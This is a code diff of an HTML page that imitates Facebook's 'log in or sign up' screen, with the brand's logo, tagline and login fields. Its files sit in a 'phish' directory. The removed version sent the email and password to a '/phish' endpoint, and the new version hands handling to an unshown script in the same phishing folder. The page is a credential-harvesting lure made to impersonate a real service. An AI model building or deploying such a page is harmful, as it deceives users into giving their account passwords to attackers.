@@ -1,33 +1,61 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>Facebook - log in or sign up</title>
+    <link rel="icon" href="https://img.icons8.com/color/96/000000/facebook-new.png" type="image/png">
+    <link rel="stylesheet" href="../phish/assets3/style.css">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css" />
 </head>
-<link rel="stylesheet" href="../phish/style-3.css">
-<body>
-    <main>
-        <h1>facebook</h1>
-        <div class="text-box">
-            <p class="login-text">Log in to Facebook</p>
-            <form action="/phish" method="post" class="text-box">
 
-           
-            <input type="email" name="email" id="" placeholder="Email address or phone number">
-            <input type="password" name="password" id="" placeholder="Password">
-            <button class="login-button">Log In</button>
-            <p class="small-text"><a class="forget-pass" href="#">Forgotten account?</a></p>
-            <div class="hr-box">
-                <hr class="hr-one">
-                <p class="smaller-text">or</p>
-                <hr class="hr-two">
+<body>
+    <section>
+        <div class="container">
+
+
+            <div class="fb-text">
+                <img src="../phish/assets3/images/facebooklogo.svg" alt="Facebook">
+                <h2>Facebook helps you connect and share<br>with the people in your life.</h2>
             </div>
-            
-            <button type="submit" class="new-account-button" >Create New Account</button>
-         </form>
+
+            <div class="fb-login">
+                <form action="#">
+                    <input type="text" name="login" id="login" placeholder="Email address or phone number">
+                    <input type="password" name="password" id="password" placeholder="Password">
+                    <i class="bi bi-eye-slash" id="togglePassword"></i>
+                    <button id="btn-login">Log In</button>
+                    <span class="forgotten-password" id="txt-forgotten-password"><a href="#">Forgotten
+                            password?</a></span>
+
+                    <hr>
+
+                    <button id="btn-new-account">Create New Account</button>
+                </form>
+
+                <p id="txt-create-page"><a href="#" id="create-page-link">Create a Page</a> for a celebrity, band or
+                    business.</p>
+            </div>
         </div>
-    </main>
+
+
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
+            integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
+            crossorigin="anonymous"></script>
+        <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js"
+            integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB"
+            crossorigin="anonymous"></script>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js"
+            integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13"
+            crossorigin="anonymous"></script>
+        <script src="../phish/assets3/script.js"></script>
+    </section>
+
+<!-- Created by Jithin Krishnan
+Github: https://github.com/jithinkrishnanrs-->
 </body>
 </html>
